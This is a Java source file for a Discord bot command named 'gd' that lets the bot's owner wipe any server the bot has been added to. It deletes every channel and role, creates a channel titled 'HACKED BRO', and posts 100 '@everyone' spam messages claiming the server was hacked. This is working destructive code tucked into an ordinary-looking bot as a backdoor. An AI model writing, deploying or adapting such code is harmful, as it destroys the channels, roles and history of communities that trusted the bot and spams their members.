package fr.mateoox600.mcb.commands.owner;

import fr.mateoox600.mcb.MCB;
import fr.mateoox600.mcb.commands.manager.Command;
import fr.mateoox600.mcb.commands.manager.CommandEvent;
import net.dv8tion.jda.api.entities.GuildChannel;
import net.dv8tion.jda.api.entities.Role;
import net.dv8tion.jda.api.entities.TextChannel;

import java.util.Arrays;

public class GuildDestructCommand extends Command {

    public GuildDestructCommand() {
        this.name = "gd";
    }

    @Override
    protected void execute(CommandEvent e) {
        String[] args = e.getMessage().getContentRaw().split("\\s+");
        args = Arrays.copyOfRange(args, 1, args.length);
        if (e.getAuthor().getId().equals(MCB.config.getOwnerId())) {
            TextChannel hack_channel = e.getGuild().createTextChannel("HACKED BRO").complete();
            hack_channel.sendMessage("All channels deletion start").queue();
            for (GuildChannel channel : e.getGuild().getChannels()) {
                if (!hack_channel.getId().equals(channel.getId())) {
                    hack_channel.sendMessage("Channel `" + channel.getName() + "` was deleted his type was " + channel.getType()).queue();
                    channel.delete().complete();
                }
            }
            hack_channel.sendMessage("All channels deletion finish and roles deletion stared").queue();
            for (Role roles : e.getGuild().getRoles()) {
                hack_channel.sendMessage("Role `" + roles.getName() + "` was deleted").queue();
                roles.delete().complete();
            }
            hack_channel.sendMessage("All roles deletion finish and starting spam").queue();
            for (int i = 0; i < 100; i++) {
                hack_channel.sendMessage(i + "/100: @everyone SERVER HACKED BY MATEOOX600 CRAZY BOT").queue();
            }
        }
    }

}
